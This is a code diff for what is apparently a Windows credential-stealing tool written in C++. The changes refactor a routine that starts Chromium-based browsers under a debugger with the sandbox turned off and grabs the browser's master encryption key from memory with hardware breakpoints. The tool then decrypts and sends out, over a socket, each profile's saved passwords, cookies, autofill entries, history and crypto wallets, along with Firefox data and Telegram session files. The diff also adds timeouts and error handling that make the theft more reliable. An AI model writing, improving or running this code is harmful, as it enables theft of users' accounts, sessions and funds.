@@ -193,7 +193,7 @@ std::string path_to_uri(const fs::path& p) {
             encoded += buf;
         }
     }
-    return "file:" + encoded + "?mode=ro&nolock=1&immutable=1";
+    return "file:///" + encoded + "?mode=ro&nolock=1&immutable=1";
 }
 
 std::string format_timestamp(double ts) {
@@ -359,14 +359,21 @@ void run_recovery(SOCKET sock) {
 
         STARTUPINFOW si = { sizeof(si) };
         PROCESS_INFORMATION pi = { 0 };
-        std::wstring cmd_line = L"\"" + exe_path + L"\" --no-first-run --no-default-browser-check";
+        std::wstring cmd_line = L"\"" + exe_path + L"\" --no-sandbox --disable-gpu --no-first-run --no-default-browser-check";
         std::vector<wchar_t> cmd_buffer(cmd_line.begin(), cmd_line.end());
         cmd_buffer.push_back(0);
 
-        if (CreateProcessW(NULL, cmd_buffer.data(), NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-            debug_loop(sock, pi.hProcess, config, user_data_dir);
+        if (CreateProcessW(NULL, cmd_buffer.data(), NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi)) {
+            std::vector<uint8_t> v20_key = debug_loop_get_key(pi.hProcess, config);
+            TerminateProcess(pi.hProcess, 0);
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
+            if (!v20_key.empty()) {
+                send_status(sock, "Master key intercepted for " + config.name);
+                extract_all_profiles_data(sock, v20_key, config, user_data_dir);
+            } else {
+                send_status(sock, "Failed to intercept key for " + config.name + " (Timeout or not found)");
+            }
         }
     }
 
@@ -614,59 +621,78 @@ size_t find_target_address(HANDLE h_process, void* base_addr, const std::string&
     return 0;
 }
 
-void debug_loop(SOCKET sock, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir) {
-    DEBUG_EVENT debug_event = { 0 }; size_t target_address = 0;
-    while (WaitForDebugEvent(&debug_event, INFINITE)) {
+std::vector<uint8_t> debug_loop_get_key(HANDLE h_process, const BrowserConfig& config) {
+    DEBUG_EVENT debug_event = { 0 };
+    size_t target_address = 0;
+    std::vector<uint8_t> extracted_key;
+    DWORD startTime = GetTickCount();
+    const DWORD timeout = 20000; // 20 seconds timeout
+
+    while (GetTickCount() - startTime < timeout) {
+        if (!WaitForDebugEvent(&debug_event, 100)) continue;
+
         switch (debug_event.dwDebugEventCode) {
-            case LOAD_DLL_DEBUG_EVENT: {
-                wchar_t buffer[MAX_PATH];
-                if (GetFinalPathNameByHandleW(debug_event.u.LoadDll.hFile, buffer, MAX_PATH, 0)) {
-                    std::wstring path = buffer; std::wstring dll_name_w(config.dll_name.begin(), config.dll_name.end());
-                    if (path.find(dll_name_w) != std::wstring::npos) {
-                        target_address = find_target_address(h_process, debug_event.u.LoadDll.lpBaseOfDll, config.name);
-                        if (target_address != 0) {
-                            std::vector<uint32_t> threads = get_all_threads(debug_event.dwProcessId);
-                            for (uint32_t thread_id : threads) set_hardware_breakpoint(thread_id, target_address);
+        case LOAD_DLL_DEBUG_EVENT: {
+            wchar_t buffer[MAX_PATH];
+            if (GetFinalPathNameByHandleW(debug_event.u.LoadDll.hFile, buffer, MAX_PATH, 0)) {
+                std::wstring path = buffer;
+                std::wstring dll_name_w(config.dll_name.begin(), config.dll_name.end());
+                if (path.find(dll_name_w) != std::wstring::npos) {
+                    target_address = find_target_address(h_process, debug_event.u.LoadDll.lpBaseOfDll, config.name);
+                    if (target_address != 0) {
+                        std::vector<uint32_t> threads = get_all_threads(debug_event.dwProcessId);
+                        for (uint32_t thread_id : threads) set_hardware_breakpoint(thread_id, target_address);
+                    }
+                }
+            }
+            break;
+        }
+        case CREATE_THREAD_DEBUG_EVENT: {
+            if (target_address != 0) set_hardware_breakpoint(debug_event.dwThreadId, target_address);
+            break;
+        }
+        case EXCEPTION_DEBUG_EVENT: {
+            if (debug_event.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {
+                if ((size_t)debug_event.u.Exception.ExceptionRecord.ExceptionAddress == target_address) {
+                    // extract_key logic moved here
+                    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, debug_event.dwThreadId);
+                    if (h_thread) {
+                        CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_FULL;
+                        if (GetThreadContext(h_thread, &ctx)) {
+                            std::vector<DWORD64> key_ptrs = config.use_r14 ? std::vector<DWORD64>{ctx.R14, ctx.R15} : std::vector<DWORD64>{ctx.R15, ctx.R14};
+                            for (DWORD64 ptr : key_ptrs) {
+                                if (ptr == 0) continue;
+                                std::vector<uint8_t> buffer(32); SIZE_T bytes_read = 0;
+                                if (ReadProcessMemory(h_process, (LPCVOID)ptr, buffer.data(), 32, &bytes_read)) {
+                                    DWORD64 data_ptr = ptr; uint64_t length = *(uint64_t*)&buffer[8];
+                                    if (length == 32) data_ptr = *(DWORD64*)&buffer[0];
+                                    std::vector<uint8_t> key(32);
+                                    if (ReadProcessMemory(h_process, (LPCVOID)data_ptr, key.data(), 32, &bytes_read)) {
+                                        bool all_zero = true; for (uint8_t b : key) if (b != 0) { all_zero = false; break; }
+                                        if (!all_zero) { extracted_key = key; break; }
+                                    }
+                                }
+                            }
                         }
+                        CloseHandle(h_thread);
+                    }
+                    if (!extracted_key.empty()) {
+                        clear_hardware_breakpoints(debug_event.dwProcessId);
+                        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
+                        return extracted_key;
                     }
                 }
-                break;
+                set_resume_flag(debug_event.dwThreadId);
             }
-            case CREATE_THREAD_DEBUG_EVENT: { if (target_address != 0) set_hardware_breakpoint(debug_event.dwThreadId, target_address); break; }
-            case EXCEPTION_DEBUG_EVENT: {
-                if (debug_event.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {
-                    if ((size_t)debug_event.u.Exception.ExceptionRecord.ExceptionAddress == target_address) {
-                        if (extract_key(sock, debug_event.dwThreadId, h_process, config, user_data_dir)) { clear_hardware_breakpoints(debug_event.dwProcessId); TerminateProcess(h_process, 0); }
-                    }
-                    set_resume_flag(debug_event.dwThreadId);
-                }
-                break;
-            }
-            case EXIT_PROCESS_DEBUG_EVENT: goto end_loop;
+            break;
+        }
+        case EXIT_PROCESS_DEBUG_EVENT:
+            ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
+            return extracted_key;
         }
         ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
     }
-end_loop:;
-}
-
-bool extract_key(SOCKET sock, uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir) {
-    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id); if (!h_thread) return false;
-    bool success = false; CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_FULL;
-    if (GetThreadContext(h_thread, &ctx)) {
-        std::vector<DWORD64> key_ptrs = config.use_r14 ? std::vector<DWORD64>{ctx.R14, ctx.R15} : std::vector<DWORD64>{ctx.R15, ctx.R14};
-        for (DWORD64 ptr : key_ptrs) {
-            if (ptr == 0) continue; std::vector<uint8_t> buffer(32); SIZE_T bytes_read = 0;
-            if (ReadProcessMemory(h_process, (LPCVOID)ptr, buffer.data(), 32, &bytes_read)) {
-                DWORD64 data_ptr = ptr; uint64_t length = *(uint64_t*)&buffer[8]; if (length == 32) data_ptr = *(DWORD64*)&buffer[0];
-                std::vector<uint8_t> key(32);
-                if (ReadProcessMemory(h_process, (LPCVOID)data_ptr, key.data(), 32, &bytes_read)) {
-                    bool all_zero = true; for (uint8_t b : key) if (b != 0) { all_zero = false; break; }
-                    if (!all_zero) { extract_all_profiles_data(sock, key, config, user_data_dir); success = true; break; }
-                }
-            }
-        }
-    }
-    CloseHandle(h_thread); return success;
+    return extracted_key;
 }
 
 void extract_passwords(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
@@ -900,18 +926,23 @@ void extract_chromium_wallets(SOCKET sock, const fs::path& profile_path, const s
 void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir) {
     std::vector<uint8_t> v10_key; bool is_dpapi = false; get_v10_key(user_data_dir, v10_key, is_dpapi);
     fs::path user_data(user_data_dir); bool is_opera = config.name.find("Opera") != std::string::npos || config.name.find("Yandex") != std::string::npos;
-    for (const auto& entry : fs::directory_iterator(user_data)) {
-        if (entry.is_directory()) {
-            if (fs::exists(entry.path() / "Preferences") || fs::exists(entry.path() / "Cookies") || fs::exists(entry.path() / "Network" / "Cookies") || fs::exists(entry.path() / "Ya Passman Data")) {
-                std::string profile_name = entry.path().filename().string();
-                std::string out_prefix = config.output_dir + "/" + profile_name;
-                extract_passwords(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
-                extract_cookies(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera, config.name, profile_name);
-                extract_autofill(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
-                extract_history(sock, entry.path(), out_prefix);
-                extract_chromium_wallets(sock, entry.path(), config.name, profile_name);
+
+    std::error_code ec;
+    for (const auto& entry : fs::directory_iterator(user_data, ec)) {
+        if (ec) break;
+        try {
+            if (entry.is_directory()) {
+                if (fs::exists(entry.path() / "Preferences") || fs::exists(entry.path() / "Cookies") || fs::exists(entry.path() / "Network" / "Cookies") || fs::exists(entry.path() / "Ya Passman Data")) {
+                    std::string profile_name = entry.path().filename().string();
+                    std::string out_prefix = config.output_dir + "/" + profile_name;
+                    extract_passwords(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
+                    extract_cookies(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera, config.name, profile_name);
+                    extract_autofill(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
+                    extract_history(sock, entry.path(), out_prefix);
+                    extract_chromium_wallets(sock, entry.path(), config.name, profile_name);
+                }
             }
-        }
+        } catch (...) {}
     }
 }
 
@@ -1158,15 +1189,19 @@ void extract_firefox_data(SOCKET sock, const BrowserConfig& config, const std::w
         for (const auto& root : search_roots) { fs::path full_path = fs::path(root) / path; if (fs::exists(full_path)) { nss_dir = full_path.parent_path(); break; } }
         if (!nss_dir.empty()) break;
     }
-    for (const auto& entry : fs::directory_iterator(user_data)) {
-        if (entry.is_directory()) {
-            fs::path profile_path = entry.path(); if (fs::exists(profile_path / "cookies.sqlite") || fs::exists(profile_path / "logins.json")) {
-                std::string profile_name = profile_path.filename().string(); std::string out_prefix = config.output_dir + "/" + profile_name;
-                extract_firefox_cookies(sock, profile_path, out_prefix, config.name, profile_name); extract_firefox_history(sock, profile_path, out_prefix); extract_firefox_autofill(sock, profile_path, out_prefix);
-                if (!nss_dir.empty()) extract_firefox_passwords(sock, profile_path, out_prefix, nss_dir);
-                extract_firefox_wallets(sock, profile_path, config.name, profile_name);
+    std::error_code ec;
+    for (const auto& entry : fs::directory_iterator(user_data, ec)) {
+        if (ec) break;
+        try {
+            if (entry.is_directory()) {
+                fs::path profile_path = entry.path(); if (fs::exists(profile_path / "cookies.sqlite") || fs::exists(profile_path / "logins.json")) {
+                    std::string profile_name = profile_path.filename().string(); std::string out_prefix = config.output_dir + "/" + profile_name;
+                    extract_firefox_cookies(sock, profile_path, out_prefix, config.name, profile_name); extract_firefox_history(sock, profile_path, out_prefix); extract_firefox_autofill(sock, profile_path, out_prefix);
+                    if (!nss_dir.empty()) extract_firefox_passwords(sock, profile_path, out_prefix, nss_dir);
+                    extract_firefox_wallets(sock, profile_path, config.name, profile_name);
+                }
             }
-        }
+        } catch (...) {}
     }
 }
 
@@ -1182,11 +1217,15 @@ void extract_telegram_session(SOCKET sock) {
         if (fs::exists(src)) send_file_from_disk(sock, src, "telegram session/tdata/" + src.filename().string());
     }
 
-    for (const auto& entry : fs::directory_iterator(tdata_path)) {
+    std::error_code ec_tel;
+    for (const auto& entry : fs::directory_iterator(tdata_path, ec_tel)) {
+        if (ec_tel) break;
         if (entry.is_directory()) {
             std::string folder_name = entry.path().filename().string();
             if (folder_name.length() == 16 && std::all_of(folder_name.begin(), folder_name.end(), [](unsigned char c) { return std::isxdigit(c); })) {
-                for (const auto& sub_entry : fs::recursive_directory_iterator(entry.path())) {
+                std::error_code ec_sub;
+                for (const auto& sub_entry : fs::recursive_directory_iterator(entry.path(), ec_sub)) {
+                    if (ec_sub) break;
                     if (!sub_entry.is_directory()) {
                         std::string filename = sub_entry.path().filename().string();
                         if (filename.find(".log") == std::string::npos && filename.find("dumps") == std::string::npos) {
